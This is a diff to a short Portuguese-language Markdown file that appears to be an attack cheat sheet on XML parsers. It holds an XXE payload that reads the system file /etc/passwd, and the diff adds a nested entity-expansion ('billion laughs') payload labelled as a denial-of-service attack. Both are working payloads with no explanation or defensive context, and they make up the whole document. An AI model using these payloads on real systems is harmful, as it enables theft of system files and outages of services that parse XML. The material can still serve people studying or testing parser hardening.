@@ -1,7 +1,23 @@
 
+# Leitura de arquivo
+
 ```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
 <data>&example;</data>
 
 ```
+
+# Ataque do tipo DOS (Denial of Service)
+
+```xml
+    <!DOCTYPE data [
+    <!ENTITY a0 "dos" >
+    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+    ]>
+    <data>&a4;</data>
+```
+
